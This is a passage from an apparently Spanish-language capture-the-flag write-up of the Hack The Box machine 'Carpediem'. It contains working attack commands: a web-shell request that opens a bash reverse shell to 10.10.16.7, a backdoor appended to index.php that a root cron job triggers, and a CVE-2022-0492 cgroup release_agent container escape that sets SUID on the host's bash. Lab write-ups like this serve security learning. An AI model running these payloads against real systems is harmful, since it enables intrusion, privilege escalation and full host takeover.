  adding: ckeditor_blocks/README.md (deflated 44%)
  adding: ckeditor_blocks/LICENSE.txt (deflated 62%)
  adding: ckeditor_blocks/ckeditor_blocks.api.php (deflated 49%)
```

Lo instalo en el CMS

<img src="/writeups/assets/img/Carpediem-htb/37.png" alt="">

<img src="/writeups/assets/img/Carpediem-htb/38.png" alt="">

Gano acceso al sistema

```null
curl -s -X GET "https://localhost:8002/modules/ckeditor_blocks/cmd.php?cmd='bash+-c'bash+-i>%26+/dev/tcp/10.10.16.7/443+0>%261'" -k
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.167] 52292
bash: cannot set terminal process group (281): Inappropriate ioctl for device
bash: no job control in this shell
www-data@90c7f522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ script /dev/null -c bash
<p/modules/ckeditor_blocks$ script /dev/null -c bash                  
Script started, output log file is '/dev/null'.
www-data@90c7f522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
<www/html/backdrop/modules/ckeditor_blocks$ reset xterm
<www/html/backdrop/modules/ckeditor_blocks$ export TERM=xterm                
LL=basha@90c7f522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ export SHE 
55 columns 209522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ stty rows  
www-data@90c7f522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ 
```

Estoy dentro de otro contenedor

```null
www-data@90c7f522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ whoami
www-data
www-data@90c7f522b842:/var/www/html/backdrop/modules/ckeditor_blocks$ hostname -I
172.17.0.2 
```

Subo el ```pspy``` y detecta un script que se ejecuta por el usuario root en el contenedor

```null
2023/02/13 05:53:16 CMD: UID=0    PID=1925   | /bin/bash /opt/heartbeat.sh 
2023/02/13 05:53:16 CMD: UID=0    PID=1926   | /bin/bash /opt/heartbeat.sh 
```

No tengo capacidad de escritura

```null
#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
	exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
	#something went wrong.  restoring from backup.
	cp /root/index.php /var/www/html/backdrop/index.php
fi
```

Pero dentro de ```/var/www/html/backdrop``` sí, por lo que puedo intentar modificar el ```index.php``` para que cuando lo ejecute root me envíe una reverse shell

```null
www-data@90c7f522b842:/var/www$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.7/443 0>&1' > /tmp/shell.sh
www-data@90c7f522b842:/var/www$ chmod +x /tmp/shell.sh

echo 'system("bash /tmp/shell.sh");' >> index.php 
```

Gano acceso como root, todavía en el contenedor

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.167] 52852
bash: cannot set terminal process group (2295): Inappropriate ioctl for device
bash: no job control in this shell
root@90c7f522b842:/var/www/html/backdrop# hostname -I
hostname -I
172.17.0.2 
root@90c7f522b842:/var/www/html/backdrop# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@90c7f522b842:/var/www/html/backdrop# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.167] 52852
bash: cannot set terminal process group (2295): Inappropriate ioctl for device
bash: no job control in this shell
root@90c7f522b842:/var/www/html/backdrop# hostname -I
hostname -I
172.17.0.2 
root@90c7f522b842:/var/www/html/backdrop# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@90c7f522b842:/var/www/html/backdrop# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

Para escapar del contenedor, busco en Hacktricks diferentes técnicas. Pero solo una es funcional. Se trata del [CVE-2022-0492](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape). La idea es crear un archivo que sea accesible desde la máquina host, modificando los archivos de configuración (Por lo que es necesario estar como root) abusando. Hay que montar el cgroup existente en un directorio temporal. Al reiniciar los procesos del cgroup es posible inyectar comandos como la máquina host, así como escalar privilegios.

Un problema a destacar que ocurre en mi caso, es que de primeras no tengo acceso a la hora de crear las monturas (Está gestionado por docker, no lo puedo modificar)

```null
root@90c7f522b842:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
mount: /tmp/cgrp: permission denied.
```

Esto se debe a que no tengo asignada la capability ```cap_sysadmin```

```null
root@90c7f522b842:/# set $(cat /proc/$$/status | grep "CapEff"); capsh --decode=$2
0x00000000a00425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
```

Pero si creo un nuevo ```cgroup``` las capabilities pasan a ser máximas

```null
root@90c7f522b842:/# unshare -UrmC bash
root@90c7f522b842:/# set $(cat /proc/$$/status | grep "CapEff"); capsh --decode=$2
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

Siguiendo toda la guía, le asigno el privilegio SUID a la bash y desde la sesión que tenía de SSH con ```hflaccus```, migro al usuario root y puedo visualizar la segunda flag

```null
root@90c7f522b842:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x; echo 1 > /tmp/cgrp/x/notify_on_release; host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`; echo "$host_path/cmd" > /tmp/cgrp/release_agent; echo '#!/bin/sh' > /cmd; echo 'chmod u+s /bin/bash' >> /cmd ;echo "ps aux > $host_path/output" >> /cmd; chmod a+x /cmd; sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

```null
hflaccus@carpediem:/etc/ssl/certs$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
hflaccus@carpediem:/etc/ssl/certs$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
e30ba364d8c2baf9db5d39b4e4e354bc
```


